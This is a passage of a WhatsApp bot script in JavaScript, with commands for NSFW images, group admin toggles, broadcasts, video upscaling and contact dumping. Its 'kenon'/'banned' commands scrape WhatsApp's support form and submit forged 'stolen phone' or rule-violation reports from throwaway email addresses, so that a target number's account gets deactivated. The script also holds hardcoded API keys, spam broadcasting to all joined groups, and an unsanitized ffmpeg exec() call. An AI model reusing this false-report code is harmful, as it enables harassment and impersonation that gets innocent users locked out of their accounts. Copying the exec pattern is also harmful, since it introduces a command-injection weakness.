Al.sendMessage(m.chat, { caption: '*හායි යාලුවනේ...👋😇*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n*✨මගෙ චැනල් එකට Join වෙන්න...💗*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n -𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥~', image: { url: xeonyresult.url } }, { quoted: m })
break
//========================
case 'pussy':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')	
if (!AntiNsfw) return m.reply('Fitur Nsfw dinonaktifkan, Siapapun tidak dapat menggunakan fitur ini karna termasuk *Nsfw*.')
await m.reply('_Loading..._')
var ahegaonsfw = JSON.parse(fs.readFileSync('./media/others/nsfw/pussy.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Al.sendMessage(m.chat, { caption: '*හායි යාලුවනේ...👋😇*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n*✨මගෙ චැනල් එකට Join වෙන්න...💗*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n -𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥~', image: { url: xeonyresult.url } }, { quoted: m })
break
//========================
case 'tentacles':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!AntiNsfw) return m.reply('Fitur Nsfw dinonaktifkan, Siapapun tidak dapat menggunakan fitur ini karna termasuk *Nsfw*.')
await m.reply('_Loading..._')
var ahegaonsfw = JSON.parse(fs.readFileSync('./media/others/nsfw/tentacles.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Al.sendMessage(m.chat, { caption: '*හායි යාලුවනේ...👋😇*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n*✨මගෙ චැනල් එකට Join වෙන්න...💗*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n -𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥~', image: { url: xeonyresult.url } }, { quoted: m })
break
//========================
case 'thighs':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!AntiNsfw) return m.reply('Fitur Nsfw dinonaktifkan, Siapapun tidak dapat menggunakan fitur ini karna termasuk *Nsfw*.')
await m.reply('_Loading..._')
var ahegaonsfw = JSON.parse(fs.readFileSync('./media/others/nsfw/thighs.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Al.sendMessage(m.chat, { caption: '*හායි යාලුවනේ...👋😇*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n*✨මගෙ චැනල් එකට Join වෙන්න...💗*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n -𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥~', image: { url: xeonyresult.url } }, { quoted: m })
break
//========================
case 'yuri':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!AntiNsfw) return m.reply('Fitur Nsfw dinonaktifkan, Siapapun tidak dapat menggunakan fitur ini karna termasuk *Nsfw*.')
await m.reply('_Loading..._')
var ahegaonsfw = JSON.parse(fs.readFileSync('./media/others/nsfw/yuri.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Al.sendMessage(m.chat, { caption: '*හායි යාලුවනේ...👋😇*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n*✨මගෙ චැනල් එකට Join වෙන්න...💗*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n -𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥~', image: { url: xeonyresult.url } }, { quoted: m })
break
//========================
case 'zettai':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!AntiNsfw) return m.reply('Fitur Nsfw dinonaktifkan, Siapapun tidak dapat menggunakan fitur ini karna termasuk *Nsfw*.')
await m.reply('_Loading..._')
var ahegaonsfw = JSON.parse(fs.readFileSync('./media/others/nsfw/zettai.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Al.sendMessage(m.chat, { caption: '*හායි යාලුවනේ...👋😇*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n*✨මගෙ චැනල් එකට Join වෙන්න...💗*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n -𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥~', image: { url: xeonyresult.url } }, { quoted: m })
break
//========================
case 'gifblowjob':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!AntiNsfw) return m.reply('Fitur Nsfw dinonaktifkan, Siapapun tidak dapat menggunakan fitur ini karna termasuk *Nsfw*.')
await m.reply('_Loading..._')
  let assss = await axios.get ("https://api.waifu.pics/nsfw/blowjob")
    var bobuff = await fetchBuffer(assss.data.url)
    var bogif = await buffergif(bobuff)
    await Al.sendMessage(m.chat,{video:bogif, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
//========================
case 'gifhentai':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!AntiNsfw) return m.reply('Fitur Nsfw dinonaktifkan, Siapapun tidak dapat menggunakan fitur ini karna termasuk *Nsfw*.')
await m.reply('_Loading..._')
var ahegaonsfw = JSON.parse(fs.readFileSync('./media/others/nsfw/gifs.json'))
var xeonyresultx = pickRandom(ahegaonsfw)
    await Al.sendMessage(m.chat,{video:xeonyresultx, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
//========================
case 'gifs': case 'foot': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!AntiNsfw) return m.reply('Fitur Nsfw dinonaktifkan, Siapapun tidak dapat menggunakan fitur ini karna termasuk *Nsfw*.')
await m.reply('_Loading..._')
let heyy
    let yeha = heyy[Math.floor(Math.random() * heyy.length)]
    if (/gifs/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gifs.json')
    if (/foot/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/foot.json')
Al.sendMessage(m.chat, { image: { url: yeha }, caption : '*හායි යාලුවනේ...👋😇*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n*✨මගෙ චැනල් එකට Join වෙන්න...💗*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n -𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥~' }, { quoted: m })
}
break
//========================
case 'antidokumen': 
case 'antidok': 
case 'antidocument':
case 'antidoc': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus Admin!')
if (!isBotAdmins) return m.reply("Saya bukan Admin grup!")
if (args[0] === "on") {
if (isAntiDoc) return m.reply(`_Kan udh aktif sebelumnya_`)
antidoc.push(m.chat)
fs.writeFileSync('./database/antidoc.json', JSON.stringify(antidoc, null, 2))
m.reply('Successfully Activated AntiDokumen')
} else if (args[0] === "off") {
if (!isAntiDoc) return m.reply(`_Kan udh nonaktif sebelumnya_`)
let anu = antidoc.indexOf(m.chat)
antidoc.splice(anu, 1)
fs.writeFileSync('./database/antidoc.json', JSON.stringify(antidoc, null, 2))
m.reply('Successfully Deactivation AntiDokumen')
} else {
m.reply(`Kirim perintah ${prefix + command} on/off\n\nContoh: ${prefix + command} on`)
}
}
break
//========================
case 'antilok': 
case 'antilokasi': 
case 'antiloc': 
case 'antilocation': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus Admin!')
if (!isBotAdmins) return m.reply("Saya bukan Admin grup!")
if (args[0] === "on") {
if (isAntiLoc) return m.reply(`_Kan udh aktif sebelumnya_`)
antiloc.push(m.chat)
fs.writeFileSync('./database/antiloc.json', JSON.stringify(antiloc, null, 2))
m.reply('Successfully Activated AntiLokasi')
} else if (args[0] === "off") {
if (!isAntiLoc) return m.reply(`_Kan udh nonaktif sebelumnya_`)
let anu = antiloc.indexOf(m.chat)
antiloc.splice(anu, 1)
fs.writeFileSync('./database/antiloc.json', JSON.stringify(antiloc, null, 2))
m.reply('Successfully Deactivation AntiLokasi')
} else {
m.reply(`Kirim perintah ${prefix + command} on/off\n\nContoh: ${prefix + command} on`)
}
}
break
//========================
case 'antikon': 
case 'antikontak':
case 'anticon':
case 'anticontact': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus Admin!')
if (!isBotAdmins) return m.reply("Saya bukan Admin grup!")
if (args[0] === "on") {
if (isAntiCon) return m.reply(`_Kan udh aktif sebelumnya_`)
anticon.push(m.chat)
fs.writeFileSync('./database/anticon.json', JSON.stringify(anticon, null, 2))
m.reply('Successfully Activated AntiKontak')
} else if (args[0] === "off") {
if (!isAntiCon) return m.reply(`_Kan udh nonaktif sebelumnya_`)
let anu = anticon.indexOf(m.chat)
anticon.splice(anu, 1)
fs.writeFileSync('./database/anticon.json', JSON.stringify(anticon, null, 2))
m.reply('Successfully Deactivation AntiKontak')
} else {
m.reply(`Kirim perintah ${prefix + command} on/off\n\nContoh: ${prefix + command} on`)
}
}
break
//========================
case 'hdvid' :
case 'hdvideo': 
case 'vidiohd':
case 'tohd': 
case 'vidhd' : {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
const { TelegraPh } = require('./lib/uploader');
const { exec } = require('child_process');
const who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? Al.user.jid : m.sender;
const name = await Al.getName(who);
const q = m.quoted ? m.quoted : m;
const mime = (q.msg || q).mimetype || '';
if (!mime) return m.reply(`Mana vidio nya bang?`);
m.reply('_Loading..._');
const media = await Al.downloadAndSaveMediaMessage(q);
const url = await TelegraPh(media);
const output = 'output.mp4'; // Nama file output
// Menggunakan ffmpeg untuk meningkatkan resolusi video ke 1080p
exec(`ffmpeg -i ${media} -s 1280x720 -c:v libx264 -c:a copy ${output}`, (error, stdout, stderr) => {
  if (error) {
    console.error(`Error: ${error.message}`);
    return;
  }
  console.log(`stdout: ${stdout}`);
  console.error(`stderr: ${stderr}`);

  // Mengunggah video yang telah ditingkatkan resolusinya
  Al.sendMessage(m.chat, { caption: `𝗠𝗔𝗡𝗨-𝗠𝗗`, video: { url: output }}, {quoted: m});
})
await sleep(600000)
fs.unlinkSync(output)
fs.unlinkSync(media)
}
break
//========================
case 'setnamabot':
case 'setnamebot':
case 'setbotname':
case 'setbotnm':
case 'setnmbot': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!isCreator) return m.reply("Special For Owner Features!")
if (!q) return m.reply(`Kirim perintah ${prefix+command} nama\n\n*Contoh :* ${command} AiBotzz-MD Aktif`)
await Al.updateProfileName(q)
await m.reply(`Berhasil mengganti nama bot ke *${q}*`)
}
break
//========================
case 'gc':
case 'group':
case 'grub':
case 'groub':
case 'grup': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus Admin grup!')
if (!isBotAdmins) return m.reply('Saya bukan Admin grup!')
if (!q) return m.reply(`*Contoh :*\n${prefix+command} buka/open\n${prefix+command} tutup/close`)
if (args[0] === "buka") {
await Al.groupSettingUpdate(m.chat, 'not_announcement')
m.reply(`Sukses mengizinkan Semua peserta dapat mengirim pesan ke grup ini.`)
}
if (args[0] === "tutup") {
await Al.groupSettingUpdate(m.chat, 'announcement')
m.reply(`Sukses mengizinkan Hanya admin yang dapat mengirim pesan ke grup ini.`)
}
if (args[0] === "open") {
await Al.groupSettingUpdate(m.chat, 'not_announcement')
m.reply(`Sukses mengizinkan Semua peserta dapat mengirim pesan ke grup ini.`)
}
if (args[0] === "close") {
await Al.groupSettingUpdate(m.chat, 'announcement')
m.reply(`Sukses mengizinkan Hanya admin yang dapat mengirim pesan ke grup ini.`)
}
}
break
//========================
// MASIH BELUM WORK🗿

case 'antiteks':
case 'antitxt':
case 'antitext': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus Admin!')
if (!isBotAdmins) return m.reply("Saya bukan Admin grup!")
if (args[0] === "on") {
if (isAntiTeks) return m.reply(`_Kan udh aktif sebelumnya_`)
antiteks.push(m.chat)
fs.writeFileSync('./database/antiteks.json', JSON.stringify(antiteks, null, 2))
m.reply('Successfully Activated AntiTeks 😂')
} else if (args[0] === "off") {
if (!isAntiTeks) return m.reply(`_Kan udh nonaktif sebelumnya_`)
let anu = antiteks.indexOf(m.chat)
antiteks.splice(anu, 1)
fs.writeFileSync('./database/antiteks.json', JSON.stringify(antiteks, null, 2))
m.reply('Successfully Deactivation AntiTeks 😂')
} else {
m.reply(`Kirim perintah ${prefix + command} on/off\n\nContoh: ${prefix + command} on`)
}
}
break
//========================
case 'antiviewonce':
case 'antivo':
case 'antiviewo': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus Admin!')
if (!isBotAdmins) return m.reply('Saya bukan Admin grup!')
if (args[0] === "on") {
if (isAntiVo) return m.reply(`_Kan udh aktif sebelumnya_`)
antivo.push(m.chat)
fs.writeFileSync('./database/antivo.json', JSON.stringify(antivo, null, 2))
m.reply('Successfully Activated AntiViewOnce')
} else if (args[0] === "off") {
if (!isAntiVo) return m.reply(`_Kan udh nonaktif sebelumnya_`)
let anu = antivo.indexOf(m.chat)
antivo.splice(anu, 1)
fs.writeFileSync('./database/antivo.json', JSON.stringify(antivo, null, 2))
m.reply('Successfully Deactivation AntiViewOnce')
} else {
m.reply(`Kirim perintah ${prefix + command} on/off\n\nContoh: ${prefix + command} on`)
}
}
break
//========================
// MASIH BELUM WORK🗿

case 'antihps': 
case 'antihapus':
case 'antidel':
case 'antidelete': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus Admin!')
if (!isBotAdmins) return m.reply("Saya bukan Admin grup!")
if (args[0] === "on") {
if (isAntiDel) return m.reply(`_Kan udh aktif sebelumnya_`)
antidel.push(m.chat)
fs.writeFileSync('./database/antidel.json', JSON.stringify(antidel, null, 2))
m.reply('Successfully Activated AntiDelete')
} else if (args[0] === "off") {
if (!isAntiDel) return m.reply(`_Kan udh nonaktif sebelumnya_`)
let anu = antidel.indexOf(m.chat)
antidel.splice(anu, 1)
fs.writeFileSync('./database/antidel.json', JSON.stringify(antidel, null, 2))
m.reply('Successfully Deactivation AntiDelete')
} else {
m.reply(`Kirim perintah ${prefix + command} on/off\n\nContoh: ${prefix + command} on`)
}
}
break
//========================
case 'report':
case 'laporan':
case 'lapor':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if(!text) return m.reply(`*Contoh :*\n${prefix+command} Ada bug Fitur polling`)
Al.sendMessage('94742274855@s.whatsapp.net', { text: `Hai Ownerku, Ada laporan nie dari seseorang\n\n*Laporan :* ${text}\n*Dari :* @${m.sender.split('@')[0]}`, mentions: [m.sender]}, { quoted: fkontak})
m.reply('Laporan udah dikirim ke pengembang\nScript ini, Tunggu dia bales/chat yaa')
}
break
//========================
case 'request':
case 'saran':
case 'reques':
case 'req':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if(!text) return m.reply(`*Contoh :*\n${prefix+command} Fitur Spotify`)
Al.sendMessage('94742274855@s.whatsapp.net', { text: `Hai Ownerku, Ada yang request nie dari seseorang\n\n*Request :* ${text}\n*Dari :* @${m.sender.split('@')[0]}`, mentions: [m.sender]}, { quoted: fkontak})
m.reply('Request udah dikirim ke pengembang\nScript ini, Tunggu dia bales/chat yaa.')
}
break
//========================
case 'bcgc1':
case 'bcmygc1':{
if (!isCreator) return m.reply('Special For Owner Features!')
if (isBan) return terbanned()
if (!q) return m.reply(`*Contoh :*\n${prefix+command} Update Script *${namabot}* v5`)
let tek = m.quoted ? quoted.text : (text ? text : "")
Al.sendMessage('120363250058335630@g.us', { text: `*BROADCAST GRUB*\n\n${tek}`, mentions: participants.map(a => a.id)}, {}, {quoted: fkontak })
m.reply('Broadcast ke grup kamu sukses terkirim!')
}
break
//========================
case 'nulis': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} text\n\nContoh : ${prefix+command} Bejirlah Woilah`)
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}
  })   
const tulisan = body.slice(11)
Al.sendMessage(m.chat, {image:{url:`https://api.lolhuman.xyz/api/nulis?apikey=3ded02033757fbd61ff60876&text=${encodeURIComponent(q)}`}, caption: "Nih kak"}, {quoted: m}).catch(async _ => await m.reply("Apikey Belum Ada"))
}
limitAdd(m.sender, limit)
break
//========================
case 'tagadmin': 
case 'listadmin': 
case 'admin':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
    const groupAdmins = participants.filter(p => p.admin)
    const listAdmin = groupAdmins.map((v, i) => `${i + 1}. @${v.id.split('@')[0]}`).join('\n')
    const owner = groupMetadata.owner || groupAdmins.find(p => p.admin === 'superadmin')?.id || m.chat.split`-`[0] + '@s.whatsapp.net'
    let text = `   
*TAG ADMIN GRUB :*
${listAdmin}
`.trim()
Al.sendMessage(m.chat, {text : text, mentions: [...groupAdmins.map(v => v.id), owner] }, {quoted: floc})
}
break
//========================
case 'bcgcs':
case 'bcgcslide': {
    if (!isCreator) return m.reply('Hanya untuk Owner!');

    let pp = await Al.profilePictureUrl(m.sender, 'image').catch(_ => 'https://i.ibb.co/2WzLyGk/profile.jpg');
    let caption = `\`</BROADCAST SLIDE>\`
    By: @${m.sender.split('@')[0]}`;

    const delay = time => new Promise(res => setTimeout(res, time));
    let getGroups = await Al.groupFetchAllParticipating();
    let groups = Object.entries(getGroups).map(entry => entry[1]);
    
    m.reply(`Mengirim Broadcast Ke ${groups.length} Chat, Waktu Selesai ${groups.length * 0.5} detik`);

    for (let group of groups) {
        await delay(500);
        let [pesan, tek, teks, inbox] = text.split('|');
        
        if (!text) {
            return `[❗] *Masukan Text:*\n\nPenggunaan: /${prefix + command} text|text|text|text\n\n*Contoh:* ${prefix + command} Halo|Aku|Pedo|Salam kenal yah`;
        }

        const url = "https://telegra.ph/file/72b973058c1985de0eda8.jpg";
        
        async function getImage(url) {
            const { imageMessage } = await generateWAMessageContent({
                image: { url }
            }, {
                upload: Al.waUploadToServer
            });
            return imageMessage;
        }

        let cards = [];
        let buttons = [
            {
                name: "cta_url",
                buttonParamsJson: `{"display_text":"👤 *「 𝙾𝚠𝚗𝚎𝚛 」*","url":"https://wa.me/94742274855?text=*ʜɪ+ᴍʀ+ᴄʏʙᴇʀ+ᴍᴀɴᴜʟ+ᴏꜰꜰɪᴄɪᴀʟ+ꜱɪʀ.🫡💗*\",\"merchant_url\":\"https://www.google.com"}`
            },
            {
                name: "cta_url",
                buttonParamsJson: `{"display_text":"👤 *「 𝐌𝐚𝐧𝐮-𝐌𝐃  💙 」*","url":"https://wa.me/94742274855?text=menu\",\"merchant_url\":\"https://www.google.com"}`
            }
        ];

        for (let i = 0; i < 4; i++) {
            cards.push({
                header: {
                    imageMessage: await getImage(url),
                    hasMediaAttachment: true,
                },
                body: {
                    text: i === 0 ? "𝙉𝙤𝙢𝙤𝙧 𝙊𝙬𝙣𝙚𝙧𝙠𝙪 𝘿𝙖𝙣 𝘼𝙠𝙪𝙪  🥰." : i === 1 ? " 𝗝𝙖𝙣𝙜𝙖𝙣 𝙡𝙪𝙥𝙖 𝙁??𝙡𝙡𝙤𝙬 🥺. " : i === 2 ? "𝘽𝙚𝙧𝙞𝙠𝙪𝙩 𝘼𝙙𝙖𝙡𝙖𝙝 𝙊𝙬𝙣𝙚𝙧 𝘿𝙖𝙣 𝙂𝙧𝙤𝙪𝙥 𝙆𝙪..  " : "𝙃𝙖𝙞 𝙂𝙪𝙮𝙨 𝘽𝙚??𝙞𝙠𝙪𝙩 𝙇𝙞𝙣𝙠 𝙄𝙣𝙛𝙤𝙧𝙢𝙖𝙨𝙞 𝙈𝘼𝙉𝙐.. "},
                nativeFlowMessage: {
                    buttons: buttons,
                },
            });
        }

        let msg = generateWAMessageFromContent(
            group.id,
            {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            body: { text: text },
                            contextInfo: {
                                mentionedJid: [m.sender],
                                quoted: m.sender,
                                isForwarded: true,
                                forwardingScore: 99999,
                                forwardedNewsletterMessageInfo: {
                                    newsletterJid: '120363232588171807@newsletter',
                                    newsletterName: '⛅ ʜɪ ʙʀᴏᴏ ||「 𝐌𝐚𝐧𝐮-𝐌𝐃  」 𝒃𝒚 ??𝒂𝒏𝒏 ??'
                                },
                            },
                            carouselMessage: {
                                cards: cards,
                                messageVersion: 1
                            }
                        }
                    }
                }
            },
            { quoted: m }
        );

        await Al.relayWAMessage(msg);
    }

    m.reply(`Sukses Mengirim Broadcast Ke ${groups.length} Group`);
}
break;
//========================
case 'undang':
case 'invite': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isBotAdmins) return m.reply('Saya bukan Admin grup!')
if (!text) return m.reply(`Masukan Nomor yang terdaftar diwhatsapp yang mau diundang\n\n*Example :*\n*${prefix + command}* 6283831409855`)
if (text.includes('+')) return m.reply(`Masukan nomor tanpa *+*`)
if (isNaN(text)) return m.reply(`Hanya Angka! dan masukan kode (nomor) negara tanpa spasi.`)
let group = m.chat
let link = 'https://chat.whatsapp.com/' + await Al.groupInviteCode(group)
await Al.sendMessage(text+'@s.whatsapp.net', {text: `≡ *GROUP INVITATION*\n\nSeseorang mengundang Anda untuk bergabung ke grup ini.\n\n*LINK GRUP*\n${link}`, mentions: [m.sender]})
m.reply(`Link undangan grup ini sukses terkirim ke nomor target!`) 
}
break
//========================
case 'getcontact': 
case 'getkon':
case 'getkontak':
case 'getcon': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return m.reply('Special For Owner Features & Admin!')
wkwkjir = await Al.sendMessage(m.chat, {text: `\n*Group :* ${groupName}\n*Member :* ${groupMetadata.participants.length}`
}, {quoted: m, ephemeralExpiration: 86400})
await sleep(1000)
Al.sendContact(m.chat, participants.map(a => a.id), wkwkjir)
}
break
//========================
/*
This feature using APIs from ai.xterm.codes
*/

case 'dalle': {
    let [text1, text2] = text.split("|")

    if (!text1) {
        return m.reply(`*Harap beri deskripsi gambarnya!*`)
    }

    try {
        let imageUrl = `https://ai.xterm.codes/api/text2img/dalle3?prompt=${encodeURIComponent(text1)}&key='Bell409'`

        if (text2) {
            imageUrl += `&prompt=${encodeURIComponent(text2)}`
        }

        await Al.sendMessage(m.chat, { 
            image: { url: imageUrl } 
        }, { quoted: m })

    } catch (error) {
        console.error('Error:', error)
        m.reply('*Terjadi kesalahan saat mencoba membuat gambar. Harap coba lagi nanti.*')
    }
}
break
//========================
case 'kenonv2':
case 'bannedv2': {
 if (!isCreator) return m.reply('Special For Owner Features!')
 if (!q) return m.reply(`Targetnya?`)
 var axioss = require ("axios")
 let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Porfavor, desative o número da minha conta, o chip e os documentos foram roubados essa conta possuí dados importante, então, por favor desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
 url,
 method: "POST",
 data: form,
 headers: {
cookie
 }
})
m.reply(`Succes ${command} Ke Nomor Tersebut\n
*NOTE :*
Harap Jeda 24 Jam...`)
}
break
//========================
case 'kenonv3':
case 'bannedv3': {
 if (!isCreator) return m.reply('Special For Owner Features!')
 if (!q) return m.reply(`Targetnya?`)
 var axioss = require ("axios")
 let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/Roubado: Por favor, desative minha conta\n\nOlá, por favor desative este número, pois perdi meu celular e alguém está usando meu número, por favor desative meu número")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
 url,
 method: "POST",
 data: form,
 headers: {
cookie
 }
})
m.reply(`Succes ${command} Ke Nomor Tersebut\n
*NOTE :*
Harap Jeda 24 Jam...`)
}
break
//========================
case 'kenonv4':
case 'bannedv4': {
 if (!isCreator) return m.reply('Special For Owner Features!')
 if (!q) return m.reply(`Targetnya?`)
 var axioss = require ("axios")
 let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "UM DE SEUS USUÁRIOS, ESTA USANDO O APK DO WHATSAPP FEITO POR TERCEIROS E ESTA INDO CONTRA OS TERMOS DE SERVIÇO PEÇO QUE ANALISEM ESSE USUÁRIO")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
 url,
 method: "POST",
 data: form,
 headers: {
cookie
 }
})
m.reply(`Succes ${command} Ke Nomor Tersebut\n
*NOTE :*
Harap Jeda 24 Jam...`)
}
break
//========================
case 'kenonv5':
case 'bannedv5': {
